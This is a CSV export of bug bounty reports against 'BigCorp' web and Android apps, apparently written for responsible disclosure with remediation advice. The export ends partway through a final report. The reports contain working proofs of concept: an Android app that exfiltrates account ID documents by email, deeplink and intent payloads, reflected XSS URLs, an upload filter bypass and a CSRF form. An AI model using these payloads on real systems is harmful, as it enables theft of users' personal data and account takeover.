reference_number,bounty_code,source,username,title,caption,priority,amount,points,paid_at,vrt_lineage,substate,state,duplicate,bug_url,description,http_request,extra_info,submitted_at,validated_at,closed_at,target_name,target_category,remediation_advice,vulnerability_references
ab81a5ea23230b0aa8e259c8749b76c390acbf1f6856c594319caaeizit9zah5,bigcorp,platform,Haxor-01,Steal files with BigCorp deeplinks exploited by third party apps on Android,Steal files with BigCorp deeplinks exploited by third party apps on Android,2,900,20,2020-01-11 10:58:24 UTC,Insecure Data Storage > Sensitive Application Data Stored Unencrypted > On External Storage,unresolved,open,false,bigcorpapp://launch/autoid,"Hello,

I found a way to access sensitive files with third party applications using BigCorp deeplinks effectively bypassing authentication (Uses persisted session from a logged in account) and CSRF protections. I've created a PoC that ex-filtrates files in three steps.

This would not be possible via web access because of CSRF protections. On mobile this acts as a shortcut to downloading Account ID cards without having to navigate to the Account section of the mobile application.

### Impact

BigCorp users can be tricked into having their sensitive data stolen via access to deeplinks by third party apps. Any document that is auto-downloaded can be ex-filtrated with the PoC provided. It's very common for apps to have sessions stay open after login and this exploit chain leverages that feature.

So far I've been able to expose the following information from my account: Full name, Account type, Account ID number, Sales Code, Phone Number. 

---

### Steps to reproduce

1. Log into the BigCorp mobile app and open my PoC app to automate the rest of the steps

### How the exploit chain works

2. Use the following deeplink by transferring this html to the Android device with `adb push bigcorp-deeplink-poc.html /sdcard/Download`.

```
<html>
<p class=""p2"">- <a href=""bigcorpapp://launch/autoid"">autoid</a></p>
</html
```
3 . The account information including full name and account ID number automatically download to `sdcard/Android/data/com.bigcorp.mobile.android.bigcorp/files/BIGCORP_DOCS/`

4 . This confirms that all request origins are accepted and allow files to be downloaded automatically.

5 . My PoC app downloads MbAutoIdCardsServlet.pdf to a public shareable directory -> copies the file and moves it to `/storage/emulated/0/Download/` -> Finally the app sends the document via email. Note: Step 3 can be completed automated with Javamail in Android. [https://medium.com/@ssaurel/how-to-send-an-email-with-javamail-api-in-android-2fc405441079](https://medium.com/@ssaurel/how-to-send-an-email-with-javamail-api-in-android-2fc405441079)

---

### PoC code

```java
package hazor.bigcorp_poc;

import android.annotation.TargetApi;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;

import android.os.Handler;
import android.os.StrictMode;
import android.support.v7.app.AppCompatActivity;
import android.util.Log;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.OutputStream;



public class MainActivity extends AppCompatActivity {

    private static final String TAG = ""PoCActivity"";
    String dir = ""sdcard/Android/data/com.bigcorp.mobile.android.bigcorp/files/BIGCORP_DOCS/"";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        StrictMode.VmPolicy.Builder builder = new StrictMode.VmPolicy.Builder(); StrictMode.setVmPolicy(builder.build());
        if (shouldAskPermissions()) {
            askPermissions();
        }
        //Step 1
        requestDeeplink();
        //Step 2
        Handler handler = new Handler();
        handler.postDelayed(new Runnable() {
            public void run() {
                Log.i(TAG, ""Starting file move"");
                moveFile(dir, ""MbAutoIdCardsServlet.pdf"", ""/storage/emulated/0/Download/"");
            }
        }, 10000);
        //Step 3
        handler.postDelayed(new Runnable() {
            public void run() {
                Log.i(TAG, ""Starting file send"");
                sendToEmail(""/storage/emulated/0/Download/"", ""AccountIDCardsServlet.pdf"");
            }
        }, 10000);
    }

    private void requestDeeplink() {
        Uri uri = Uri.parse(""bigcorpapp://launch/autoid"");
        Intent startDownloadIntent = new Intent(Intent.ACTION_VIEW, uri);
        startActivity(startDownloadIntent);
    }

    private void moveFile(String inputPath, String inputFile, String outputPath) {

        InputStream in = null;
        OutputStream out = null;
        try {

            //create output directory if it doesn't exist
            File dir = new File (outputPath);
            if (!dir.exists())
            {
                dir.mkdirs();
            }


            in = new FileInputStream(inputPath + inputFile);
            out = new FileOutputStream(outputPath + inputFile);

            byte[] buffer = new byte[1024];
            int read;
            while ((read = in.read(buffer)) != -1) {
                out.write(buffer, 0, read);
            }
            in.close();
            in = null;

            // write the output file
            out.flush();
            out.close();
            out = null;

            // delete the original file
            new File(inputPath + inputFile).delete();


        }

        catch (FileNotFoundException fnfe1) {
            Log.e(""tag"", fnfe1.getMessage());
        }
        catch (Exception e) {
            Log.e(""tag"", e.getMessage());
        }

    }

    private void sendToEmail(String folder_name, String file_name) {
        try {
            Intent intent = new Intent(Intent.ACTION_SENDTO);
            intent.setType(""text/plain"");
            String message=""File to be shared is "" + file_name + ""."";
            intent.putExtra(Intent.EXTRA_SUBJECT, ""Subject"");
            intent.putExtra(Intent.EXTRA_STREAM, Uri.parse( ""file:///"" + folder_name + file_name));
            intent.putExtra(Intent.EXTRA_TEXT, message);
            intent.setData(Uri.parse(""mailto:hazor@example.com""));
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);

            startActivity(intent);
            
        } catch(Exception e)  {
            System.out.println(""is exception raises during sending mail"" + e);
        }
    }
    protected boolean shouldAskPermissions() {
        return (Build.VERSION.SDK_INT > Build.VERSION_CODES.LOLLIPOP_MR1);
    }

    @TargetApi(23)
    protected void askPermissions() {
        String[] permissions = {
                ""android.permission.READ_EXTERNAL_STORAGE"",
                ""android.permission.WRITE_EXTERNAL_STORAGE""
        };
        int requestCode = 200;
        requestPermissions(permissions, requestCode);
    }

}

```

---

### How to fix

Some ideas on how to fix this.

1. Check origin of the deeplink request and only allow requests from bigcorp.com or mobile apps

2. Download files to a non-public directory like `/data/data/com.bigcorp.mobile.android.bigcorp/cache/*` 

3. Restrict app's protected folders and URIs

Please let me know if you have any questions!
",,,2020-03-01 06:15:06 UTC,2020-03-04 16:09:59 UTC,,BigCorp Mobile Application for Android,android,"1. Never store sensitive application data unencrypted.
2. Use the strongest encryption algorithms such as AES with a minimum of a 256-bit key size for application data storage.","* [https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Cryptographic_Storage_Cheat_Sheet.md](https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Cryptographic_Storage_Cheat_Sheet.md)
* [https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure](https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure)
* [https://cwe.mitre.org/data/definitions/312](https://cwe.mitre.org/data/definitions/312)
* [https://cwe.mitre.org/data/definitions/729](https://cwe.mitre.org/data/definitions/729)
* [https://cwe.mitre.org/data/definitions/922](https://cwe.mitre.org/data/definitions/922)"
jangoo9aijdd38d85d0e862de1a8b0e11e20af5551cbe57af5effd407fb1e455,bigcorp,platform,Haxor-02,[BigCorp Android] Remote access to arbitrary fragments,[BigCorp Android] Remote access to arbitrary fragments,2,1000,20,2018-09-22 16:11:46 UTC,Broken Access Control (BAC),unresolved,open,false,,"Hi, attacker can remotely (without installing any third-party apps, e.g. directly from a web browser) access arbitrary existing fragments and attack their functionality.

The problem is in ``` com/bigcorp/mobile/android/app/core/BaseActivity.java ``` which is superclass for exported components (e.g. ``` com.bigcorp.mobile.android.app.marketing.MarketingUniversalLinkActivity ```)
```java
	    private void determineDeepDive() {
	        if (getIntent().getBooleanExtra(""isDeepDive"", false)) { // attacker provided value
	            java.lang.String stringExtra = getIntent().getStringExtra(""targetFragment""); // attacker provided class for launching fragment
	            if (!android.text.TextUtils.isEmpty(stringExtra)) {
	                try {
	                    java.lang.Class cls = java.lang.Class.forName(stringExtra);
	                    if (cls != null) {
	                        java.lang.Object newInstance = cls.newInstance();
	                        if (newInstance instanceof android.support.v4.app.Fragment) {
	                            ((android.support.v4.app.Fragment) newInstance).setArguments(getIntent().getExtras()); // arguments for the fragment is also attacker provided in the same intent
	                        }
	                        this.hasAddedDeepFragment = false;
	                        setupFragment(newInstance); // fragment is launched
```

PoC (from a web-browser):
```html
<!DOCTYPE html>
<html>
<head><title>Example page</title></head>
<body style=""text-align: center;"">
    <h1><a href=""intent://www.bigcorp.com/pages/account_main#Intent;scheme=https;B.isDeepDive=true;S.url=http%3A%2F%2Fbase64.ru%2F;S.targetFragment=com.bigcorp.mobile.android.inf.webview.WebFragment;end"">Begin Check!</a></h1>
</body>
</html>
```
(online URL https://s3.amazonaws.com/haxors4tw/doh.html)

Once user taps on ``` Begin Check! ``` BigCorp app is automatically opened with ``` com.bigcorp.mobile.android.inf.webview.WebFragment ```.

You may want to build your own exploits against other fragments, use the following code for that:
```java
        Intent intent = new Intent();
        intent.setData(Uri.parse(""https://www.bigcorp.com/pages/account_main""));
        intent.putExtra(""isDeepDive"", true);
        intent.putExtra(""targetFragment"", ""com.bigcorp.mobile.android.inf.webview.WebFragment"");
        intent.putExtra(""url"", ""http://base64.ru/"");
        Log.d(""Doh"", intent.toUri(Intent.URI_INTENT_SCHEME));
```
and put the string to ``` <a href=""..."" ```

Full list of vulnerable fragments can be retrieved by command
```
grep android.support.v4.app.Fragment -r . | grep extends
```
I found 129 candidates",,,2018-09-19 19:46:16 UTC,2018-09-25 18:32:22 UTC,,BigCorp Mobile Application for Android,android,,* [https://cwe.mitre.org/data/definitions/723](https://cwe.mitre.org/data/definitions/723)
d44b95d792de018373be4ff3425d22159217be7552b902ba1f3030ohbie2ve1w,bigcorp,platform,Haxor-03,Bypassing file upload filter for potential XSS,Bypassing file upload filter for potential XSS,3,400,10,2020-02-28 18:19:34 UTC,Cross-Site Scripting (XSS),unresolved,open,false,https://www.bigcorp.com/ActivityList/ActivityList?3&activityTypeCd=DOCUPLD&activityId=74140DOCUPLD1048758188&wa_ref=cntr_quicklinks_checklist_ref,"Right after signing up for your service you are requested to submit a few documents for verification. This upload seems to be slightly different from the normal document upload function, specifically that it should allow less filetypes by default 
![image.png](https://bugcrowd.com/embed/bc32510e-do5b-4623-987c-f01db42364bc/74ab0923-6195-413f-b097-5c4ffedd4867 ""image.png"") compared to the normal document upload ![normal.png](https://bugcrowd.com/embed/bc32510e-do5b-4623-987c-f01db42364bc/b2bac822-c7b5-a44a-9473-42a781f734ec ""normal.png""). But it appears that the validation on the normal file upload is much better than the one on the verification file upload this is targeting.

It appears that in the POST request that uploads the file the ""Content-type:"" header in the multipart form is completely ignored, as is the file ending. The verification is done by checking the first few bytes of the file to decide if it should be uploaded. Once it is uploaded im not 100% confident what happens, it appears that after it is checked and uploaded the actual file type is decided by the file ending instead of the mimetype. This results in being able to upload arbitrary content, BUT most of them just get reflected as content type ""Octet-stream"". I have found that .html works just fine and is loaded as a valid html document.

#Steps to reproduce:
1. Register a new account via the signup form. (Note: It might be required to select that you have a medical background, since the file upload is labeled medical verification)
2. Once logged in to your account, skip the ""tour"" and click your name in the top right, then select ""Send Documents to BigCorp"" from the dropdown menu.
3. You should see the following ![req_docs.png](https://bugcrowd.com/embed/bc32510e-do5b-4623-987c-f01db42364bc/12b40c5c-2866-4735-8e02-8ccd222bba29 ""req_docs.png"")
4. Click start upload and upload the file i provided ![Haxor-03.gif](https://bugcrowd.com/embed/bc32510e-do5b-4623-987c-f01db42364bc/2f6a3da1-c477-f147-5749-5c8d47451204 ""Haxor-03.gif"") , which is a GIF/html polyglot to bypass the mime check
5. Intercept the request for the file upload and change the filename from ""Haxor-03.gif"" to ""Haxor-03.html"", the file should upload successfully.
6. Open the uploaded file still called ""Haxor-03.gif"" in a new tab and watch the XSS pop ![xss_pop.png](https://bugcrowd.com/embed/bc32510e-do5b-4623-987c-f01db42364bc/827d50bb-7925-45d7-c54a-22e2919717d1 ""xss_pop.png"")

I havent found a way to share the link in any way with another user to attack another user, or havent found a way to bypass the implemented security measure.
This is where i have to rely on the good faith of your security team.
My assumption here is that on your end the support is running either the same webapp with more admin features or a different webapp to check the attachments we send you. Since you should only receive the named document formats which are more or less safe, i would assume that the support employee would open the attachment without worries, in this case executing the malicious html file still called ""Haxor-03.gif"" essentially executing arbitrary javascript in your support app.

I would feel bad confirming this myself since i only have 10 real chances per account to exploit this and maybe get a callback from the executed javascript, essentially having to create multiple accounts and spamming support to achieve this. Or somehow figure out what software you run on the backend, which would most likely also involve unwanted spam to the support.

So in a best case scenario this is a XSS on your internal app with a high to critical impact, or a simple filter bypass with low impact. Which should be fixed either way.",,"If you need any more information please tell me and i'll do my best to answer.
In the meantime i will try to find more ways this could be abused.",2020-01-12 03:27:14 UTC,2020-01-27 02:53:00 UTC,,www.bigcorp.com,website,"1. Always treat all user input as untrusted data.
2. Never insert untrusted data except in allowed locations.
3. Always input or output-encode all data coming into or out of the application.
4. Always whitelist allowed characters and seldom use blacklisting of characters except in certain use cases.
5. Always use a well-known and security encoding API for input and output encoding such as the `OWASP ESAPI`.
6. Never try to write input and output encoders unless absolutely necessary. Chances are that someone has already written a good one.
7. Never use the DOM function `innerHtml` and instead use the functions `innerText` and `textContent` to prevent against DOM-based XSS.
8. As a best practice, consider using the `HTTPOnly` flag on cookies that are session tokens or sensitive tokens.
9. As a best practice, consider implementing `Content Security Policy` to protect against XSS and other injection type attacks.
10. As a best practice, consider using an auto-escaping templating system.
11. As a best practice, consider using the `X-XSS-Protection` response header.","* [https://www.owasp.org/index.php/Top_10-2017_A7-Cross-Site_Scripting_(XSS)](https://www.owasp.org/index.php/Top_10-2017_A7-Cross-Site_Scripting_(XSS))
* [https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)](https://www.owasp.org/index.php/Cross-site_Scripting_(XSS))
* [https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.md](https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.md)
* [http://projects.webappsec.org/Cross-Site+Scripting](http://projects.webappsec.org/Cross-Site+Scripting)
* [https://www.cvedetails.com/vulnerability-list/opxss-1/xss.html](https://www.cvedetails.com/vulnerability-list/opxss-1/xss.html)
* [https://cwe.mitre.org/data/definitions/79](https://cwe.mitre.org/data/definitions/79)"
gie9abee0o548a196021761b8de0dfc66794553b2c1ea5f4d804eb73b8dd7f08,bigcorp,platform,Haxor-04,Reflected XSS [token] – vendors.bigcorp.com,Reflected XSS [token] – vendors.bigcorp.com,3,400,10,2018-08-24 16:21:46 UTC,Cross-Site Scripting (XSS) > Reflected > Non-Self,unresolved,open,false,,"# Steps to reproduce
Just visit the following URL in Firefox: `https://www.vendors.bigcorp.com/logon_partner/Logon?tok=%3E%3Cabc%20onbeforescriptexecute=%27confirm(document.domain)%27%3E`.",,,2018-07-24 09:01:01 UTC,2018-07-24 17:42:11 UTC,,vendors.bigcorp.com,other,"1. Always treat all user input as untrusted data.
2. Never insert untrusted data except in allowed locations.
3. Always input or output-encode all data coming into or out of the application.
4. Always whitelist allowed characters and seldom use blacklisting of characters except in certain use cases.
5. Always use a well-known and security encoding API for input and output encoding such as the `OWASP ESAPI`.
6. Never try to write input and output encoders unless absolutely necessary. Chances are that someone has already written a good one.
7. Never use the DOM function `innerHtml` and instead use the functions `innerText` and `textContent` to prevent against DOM-based XSS.
8. As a best practice, consider using the `HTTPOnly` flag on cookies that are session tokens or sensitive tokens.
9. As a best practice, consider implementing `Content Security Policy` to protect against XSS and other injection type attacks.
10. As a best practice, consider using an auto-escaping templating system.
11. As a best practice, consider using the `X-XSS-Protection` response header.","* [https://www.owasp.org/index.php/Top_10_2013-A3-Cross-Site_Scripting_(XSS)](https://www.owasp.org/index.php/Top_10_2013-A3-Cross-Site_Scripting_(XSS))
* [https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)](https://www.owasp.org/index.php/Cross-site_Scripting_(XSS))
* [https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet](https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet)
* [http://projects.webappsec.org/Cross-Site+Scripting](http://projects.webappsec.org/Cross-Site+Scripting)
* [https://www.cvedetails.com/vulnerability-list/opxss-1/xss.html](https://www.cvedetails.com/vulnerability-list/opxss-1/xss.html)
* [https://cwe.mitre.org/data/definitions/79](https://cwe.mitre.org/data/definitions/79)"
gie9abee0oa16354838a8af71dedc323b3f8268863250fe01b6000b0gie9abee0o,bigcorp,platform,Haxor-02,[BigCorp Android] Opening arbitrary URLs/XSS in WebActivity,[BigCorp Android] Opening arbitrary URLs/XSS in WebActivity,4,100,5,2018-11-11 11:41:41 UTC,Cross-Site Scripting (XSS),unresolved,open,false,,"Hi, activity ``` com.bigcorp.mobile.android.app.core.webview.WebActivity ``` is exported and can be accessed by any third-party apps installed on the same device
```xml
	        <activity android:name=""com.bigcorp.mobile.android.app.core.webview.WebActivity"" android:configChanges=""keyboardHidden|orientation|screenSize"" android:windowSoftInputMode=""adjustPan"" android:parentActivityName=""com.bigcorp.mobile.android.app.common.MyBigCorpActivity"">
	            <meta-data android:name=""android.support.PARENT_ACTIVITY"" android:value=""com.bigcorp.mobile.android.app.common.MyBigCorpActivity""/>
	            <intent-filter>
	                <action android:name=""com.bigcorp.action.smartlink""/>
	                <category android:name=""android.intent.category.DEFAULT""/>
	                <data android:scheme=""https""/>
	                <data android:host=""*.bigcorp.com""/>
	                <data android:path=""/ent_message/MessageMainPage/AccountsView""/>
	            </intent-filter>
	            ...
	        </activity>
```

File ``` com/bigcorp/mobile/android/app/core/webview/WebActivity.java ```
```java
    protected void mo11837a(android.content.Intent intent) {
        if (intent == null) {
            intent = getIntent();
        }
        if (intent.getStringExtra(""Url"") != null) {
            this.f7218d = com.bigcorp.mobile.android.inf.utils.C2624p.m12188c(intent.getStringExtra(""Url"")); // retrieving attacker provided data
```
```java
	            if (com.bigcorp.mobile.android.inf.utils.C2622n.m12164a(this.f7219e)) {
	                this.f7215a.loadUrl(this.f7218d, com.bigcorp.mobile.android.inf.services.p063c.C2598b.m11973a()); // launching browser
```

PoC:
```java
        Intent intent = new Intent();
        intent.setClassName(""com.bigcorp.mobile.android.bigcorp"",
                ""com.bigcorp.mobile.android.app.core.webview.WebActivity"");
        intent.putExtra(""Url"", ""http://base64.ru"");
        startActivity(intent);
```
APK is attached. Result is also shown on the attached screenshot",,,2018-09-18 20:13:37 UTC,2018-09-25 18:23:18 UTC,,BigCorp Mobile Application for Android,android,"1. Always treat all user input as untrusted data.
2. Never insert untrusted data except in allowed locations.
3. Always input or output-encode all data coming into or out of the application.
4. Always whitelist allowed characters and seldom use blacklisting of characters except in certain use cases.
5. Always use a well-known and security encoding API for input and output encoding such as the `OWASP ESAPI`.
6. Never try to write input and output encoders unless absolutely necessary. Chances are that someone has already written a good one.
7. Never use the DOM function `innerHtml` and instead use the functions `innerText` and `textContent` to prevent against DOM-based XSS.
8. As a best practice, consider using the `HTTPOnly` flag on cookies that are session tokens or sensitive tokens.
9. As a best practice, consider implementing `Content Security Policy` to protect against XSS and other injection type attacks.
10. As a best practice, consider using an auto-escaping templating system.
11. As a best practice, consider using the `X-XSS-Protection` response header.","* [https://www.owasp.org/index.php/Top_10_2013-A3-Cross-Site_Scripting_(XSS)](https://www.owasp.org/index.php/Top_10_2013-A3-Cross-Site_Scripting_(XSS))
* [https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)](https://www.owasp.org/index.php/Cross-site_Scripting_(XSS))
* [https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet](https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet)
* [http://projects.webappsec.org/Cross-Site+Scripting](http://projects.webappsec.org/Cross-Site+Scripting)
* [https://www.cvedetails.com/vulnerability-list/opxss-1/xss.html](https://www.cvedetails.com/vulnerability-list/opxss-1/xss.html)
* [https://cwe.mitre.org/data/definitions/79](https://cwe.mitre.org/data/definitions/79)"
f92d8273aa0db5f0ae10187beb890a0d8a7acaa6a94c9f9764da41gie9abee0o,bigcorp,platform,Haxor-01,Remote DOS via null byte %00 injection with bigcorpapp://exe/badgeCount?badgeCount=%00,Remote DOS via null byte %00 injection with bigcorpapp://exe/badgeCount?badgeCount=%00,4,100,5,2020-02-22 22:22:23 UTC,Application-Level Denial-of-Service (DoS) > Critical Impact and/or Easy Difficulty,unresolved,open,false,bigcorpapp://exe/badgeCount?badgeCount=,"Hello,

I found a way to make the BigCorp Android app unusable. This exploit doesn't crash the app, the only way the user can use the app again is exiting and opening the BigCorp Android app again. 

### Impact

Users can't access their BigCorp info until reopening the application. This deeplink opens and preloads an invalid value for the notification badgeCount forcing the user to close and open the app again.

---

### Steps to reproduce

1. Use the following PoC

2. Login

3. The BigCorp Android app will immediately go to background and stay open. 

---

### PoC code

```
<html>
<p><a href=""bigcorpapp://exe/badgeCount?badgeCount=%00"">Remote DOS</a></p>
</html>
```

---

### Fix

The easiest fix is checking for values that aren't integers and setting an input limit for the badgeCount parameter. Please let me know if you have any questions. 
",,,2020-03-07 08:17:42 UTC,2020-03-16 01:24:29 UTC,,BigCorp Mobile Application for Android,android,"There are techniques to avoid some DoS attacks at the code level such as: Performing thorough input validations, avoiding highly CPU consuming operations, and operations which must wait for completion of large tasks to proceed, splitting operations to chunks, setting timeout timers for unreasonable time, trying to create as few bottlenecks as possible.","* [https://www.owasp.org/index.php/Application_Denial_of_Service](https://www.owasp.org/index.php/Application_Denial_of_Service)
* [https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Denial_of_Service_Cheat_Sheet.md](https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Denial_of_Service_Cheat_Sheet.md)
* [http://projects.webappsec.org/Denial-of-Service](http://projects.webappsec.org/Denial-of-Service)
* [https://www.cvedetails.com/vulnerability-list/opdos-1/denial-of-service.html](https://www.cvedetails.com/vulnerability-list/opdos-1/denial-of-service.html)
* [https://www.owasp.org/images/d/da/OWASP_IL_7_Application_DOS.pdf](https://www.owasp.org/images/d/da/OWASP_IL_7_Application_DOS.pdf)
* [https://cwe.mitre.org/data/definitions/400](https://cwe.mitre.org/data/definitions/400)"
gie9abee0od1cda42e6294d32e68bf14c4c5481af517ac6522eb21fb30fa58ce,bigcorp,platform,Haxor-05,[Weak Login Function] An attacker can login a victim to their account,[Weak Login Function] An attacker can login a victim to their account,4,100,5,2019-10-20 10:20:30 UTC,Broken Authentication and Session Management > Weak Login Function > Other Plaintext Protocol with no Secure Alternative,unresolved,open,false,://www.bigcorp.com/ent_sso/sso?ddl=https%3A%2F%2Fwww.bigcorp.com%2Fent_home%2FCp%3Faction%3DINIT%26redirect%3Dtrue%26mobileToaccount%3Dtrue&xcti=qqAkUiDx4dXfzzVRRzmrMRq3DcxybmNJ1Hu7mKYCIgoh2jUXNtMKPqdwx%2BcvsOOw%2F6Z7zSNq4UU9%0D%0A8Qt04LqmnDjCNdTm1hovCMbaAJBJGg78KYaNoB3cQ2xjdVMGHg2a4rRIBbFGFIPKBWlLh6fEIKsL%0D%0AdfS4EM%2FbJNoNQJ%2BLdkfitkqtqqr41DWSCcrCV%2BaMb2jmkCphGw8l4TnJi3enWI7Jn5icGzsJi58r%0D%0ATFzs9aArw2w0GQor1BHVQA1wa7PuTIg3L3QnGCAYqxV2uWwWFuPrHQhjsbbnPW2oMJcOyJY%2Fi7%2Fa%0D%0AObtb0uxNndybO1gL0xbNXsIFjSIT5EBXINAusw%3D%3D%0D%0A&redirect=true&mobileToaccount=truhttps://www.bigcorp.com/ent_sso/sso?ddl=https%3A%2F%2Fwww.bigcorp.com%2Fent_home%2FCp%3Faction%3DINIT%26redirect%3Dtrue%26mobileToaccount%3Dtrue&xcti=qqAkUiDx4dXfzzVRRzmrMRq3DcxybmNJ1Hu7mKYCIgoh2jUXNtMKPqdwx%2BcvsOOw%2F6Z7zSNq4UU9%0D%0A8Qt04LqmnDjCNdTm1hovCMbaAJBJGg78KYaNoB3cQ2xjdVMGHg2a4rRIBbFGFIPKBWlLh6fEIKsL%0D%0AdfS4EM%2FbJNoNQJ%2BLdkfitkqtqqr41DWSCcrCV%2BaMb2jmkCphGw8l4TnJi3enWI7Jn5icGzsJi58r%0D%0ATFzs9aArw2w0GQor1BHVQA1wa7PuTIg3L3QnGCAYqxV2uWwWFuPrHQhjsbbnPW2oMJcOyJY%2Fi7%2Fa%0D%0AObtb0uxNndybO1gL0xbNXsIFjSIT5EBXINAusw%3D%3D%0D%0A&redirect=true&mobileToaccount,"Hello Security Team Members,

#Description
I found that there is no CSRF protection when a user clicks on full-site login using a mobile site that allows an attacker to login victim to attacker account. After that when a victim will make any changes that an attacker can get.

#Steps To Reproduce:
From an attacker account
1- Login to your account
2- Click on ""Switch to full site"" that would be at the end of the page
3- Take the complete URL with a token

Now go to the victim account and share the link.

#POC
Please see the attached video and let me know if more information is needed.
Thanks
Haxor-07
",,,2019-10-18 17:07:01 UTC,2019-10-23 21:19:00 UTC,,mobile.bigcorp.com,website,"Login forms should always be served over `HTTPS`, as well as all credentials should be transmitted over an encrypted channel at all times.

Always provide secure protocols for authentication connections as well as consider disabling any insecure protocols that are available.","* [https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Authentication_Cheat_Sheet.md#transmit-passwords-only-over-tls-or-other-strong-transport](https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Authentication_Cheat_Sheet.md#transmit-passwords-only-over-tls-or-other-strong-transport)
* [https://www.owasp.org/index.php/Top_10-2017_A2-Broken_Authentication](https://www.owasp.org/index.php/Top_10-2017_A2-Broken_Authentication)
* [https://www.owasp.org/index.php/Broken_Authentication_and_Session_Management](https://www.owasp.org/index.php/Broken_Authentication_and_Session_Management)
* [https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Authentication_Cheat_Sheet.md](https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Authentication_Cheat_Sheet.md)
* [http://projects.webappsec.org/Insufficient-Authentication](http://projects.webappsec.org/Insufficient-Authentication)
* [https://www.cvedetails.com/vulnerability-list/opgpriv-1/gain-privilege.html](https://www.cvedetails.com/vulnerability-list/opgpriv-1/gain-privilege.html)
* [https://cwe.mitre.org/data/definitions/523](https://cwe.mitre.org/data/definitions/523)
* [https://cwe.mitre.org/data/definitions/930](https://cwe.mitre.org/data/definitions/930)"
3215874c59325fabc68a634bf284d5e1099d18c649744a9ba63b26gie9abee0o,bigcorp,platform,Haxor-05,[CSRF] A bug allows to edit a victim group,[CSRF] A bug allows to edit a victim group,4,100,5,2020-03-15 17:12:53 UTC,Cross-Site Request Forgery (CSRF) > Action-Specific > Authenticated Action,unresolved,open,false,https://mobile.bigcorp.com/ent_Account/ManageAccount/EditGroup,"Hello Security Team Members,

#Description

I found that on the group edit feature, the CSRF token is not working as intended and that allows an attacker to edit victims group. This attack will only work if a victim previously clicks on the edit button on any group.

#Steps To Reproduce

0- If you don't have any group, then first create a group on your account from the following URL.
`https://mobile.bigcorp.com/manageAccounts/ManageAccounts/CreateGroup`

1- After creating a group, click on the edit any group.
2- That will give you a number, take the Number and add it in the attached CSRF.html file
3- Open the CSRF.html file in the victim browser.


#POC
Please see the attached video and let me know if more information is needed.

Thanks
Haxor-07","<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action=""https://mobile.bigcorp.com/manageAccount/ManageAccounts/EditGroup?NUMBER-1.IFormSubmitListener-editGroupForm"" method=""POST"">
      <input type=""hidden"" name=""CSRFToken"" value="""" />
      <input type=""hidden"" name=""id193&#95;hf&#95;0"" value="""" />
      <input type=""hidden"" name=""id193&#95;hf&#95;0"" value="""" />
      <input type=""hidden"" name=""groupNamePITable&#58;groupNamePITable&#95;body&#58;groupNameInputSection&#58;groupNameInputSection&#95;body&#58;groupNameInputRow&#58;groupNameInputRow&#95;body&#58;groupNameInputField"" value=""testaaa12222"" />
      <input type=""hidden"" name=""doneButton"" value=""Done"" />
      <input type=""submit"" value=""Submit request"" />
    </form>
  </body>
</html>

",,2020-02-05 02:20:33 UTC,2020-02-06 23:43:43 UTC,,mobile.bigcorp.com,website,"1. Consider using a known and secure CSRF synchronizer API and apply the generated CSRF token to every request. If infeasible to apply to every request, generate a CSRF token for the entire session and apply that to every request or, at minimum, every request considered sensitive. Always make sure to check the actual CSRF token.
2. Consider verifying using same-origin rules to the source and target by checking the `Origin` and `Referer` headers.
3. Consider using the `Double Submit Cookie` pattern.
4. Consider using the `Encrypted Token` pattern.
5. Consider protecting REST services by using the `X-Requested-With: XMLHttpRequest` header in all requests.
6. Consider using re-authentication in cases where the request is particularly sensitive. This is the most effective CSRF prevention technique, however it does disturb the entire user experience.","* [https://www.owasp.org/index.php/Top_10_2013-A8-Cross-Site_Request_Forgery_(CSRF)](https://www.owasp.org/index.php/Top_10_2013-A8-Cross-Site_Request_Forgery_(CSRF))
* [https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.md](https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.md)
* [http://projects.webappsec.org/w/page/13246919/Cross%20Site%20Request%20Forgery](http://projects.webappsec.org/w/page/13246919/Cross%20Site%20Request%20Forgery)
* [https://www.cvedetails.com/vulnerability-list/opcsrf-1/csrf.html](https://www.cvedetails.com/vulnerability-list/opcsrf-1/csrf.html)
* [https://cwe.mitre.org/data/definitions/352](https://cwe.mitre.org/data/definitions/352)"
gie9abee0o524340c183cbe36c0942f64c41e30daf1de0b1149b1b4413cae645,bigcorp,platform,Haxor-06,Reflected XSS in *.bigcorp.com,Reflected XSS in *.bigcorp.com,4,100,5,2019-04-04 14:24:34 UTC,Cross-Site Scripting (XSS) > Reflected,unresolved,open,false,https://(www|mobile).bigcorp.com/apps/QuoteEngine,"Hello,

I found Reflected XSS on the main and mobile domains.

**Affected domains:** www.bigcorp.com, mobile.bigcorp.com

**Affected parameter:** launchPoint

